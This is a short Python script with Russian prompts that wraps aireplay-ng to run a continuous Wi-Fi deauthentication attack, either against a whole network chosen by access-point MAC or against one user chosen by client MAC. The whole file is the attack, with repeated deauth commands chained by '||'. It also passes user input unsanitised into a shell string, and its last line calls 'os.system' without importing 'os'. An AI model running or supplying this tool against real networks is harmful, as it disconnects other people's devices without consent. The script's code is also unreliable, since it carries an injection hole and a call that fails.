from os import system
print("Провести атаку на конкретного пользователя или на всю сеть?\n 1-вся сеть\n 2-один пользователь")
ataca = input()

if ataca == "1":
    print("Введите Мас адрес сети")
    wifi = input()
    system("aireplay-ng --deauth 0 -a " + wifi + " wlan0mon" "||" "aireplay-ng --deauth 0 -a " + wifi + " wlan0mon" "||" "aireplay-ng --deauth 0 -a " + wifi + " wlan0mon" "||" "aireplay-ng --deauth 0 -a " + wifi + " wlan0mon" "||" "aireplay-ng --deauth 0 -a " + wifi + " wlan0mon" "||" "aireplay-ng --deauth 0 -a " + wifi + " wlan0mon" "||" "aireplay-ng --deauth 0 -a " + wifi + " wlan0mon" "||" "aireplay-ng --deauth 0 -a " + wifi + " wlan0mon" "||" "aireplay-ng --deauth 0 -a " + wifi + " wlan0mon" "||" "aireplay-ng --deauth 0 -a " + wifi + " wlan0mon" "||" "aireplay-ng --deauth 0 -a " + wifi + " wlan0mon" "||" "echo 'Произошла ошибка' ")

if ataca == "2":
    print("Введите Мас адрес сети")
    wifi = input()
    print("Введите Мас адрес пользователя")
    client = input()
    system("aireplay-ng --deauth 0 -a " + wifi + " -c " + client + " wlan0mon" "||" "aireplay-ng --deauth 0 -a " + wifi + " -c " + client + " wlan0mon" "||" "aireplay-ng --deauth 0 -a " + wifi + " -c " + client + " wlan0mon" "||" "aireplay-ng --deauth 0 -a " + wifi + " -c " + client + " wlan0mon" "||" "aireplay-ng --deauth 0 -a " + wifi + " -c " + client + " wlan0mon" "||" "aireplay-ng --deauth 0 -a " + wifi + " -c " + client + " wlan0mon" "||" "aireplay-ng --deauth 0 -a " + wifi + " -c " + client + " wlan0mon" "||" "aireplay-ng --deauth 0 -a " + wifi + " -c " + client + " wlan0mon" "||" "aireplay-ng --deauth 0 -a " + wifi + " -c " + client + " wlan0mon" "||" "aireplay-ng --deauth 0 -a " + wifi + " -c " + client + " wlan0mon" "||" "echo 'Произошла ошибка'")
    
os.system("sleep 500")
    

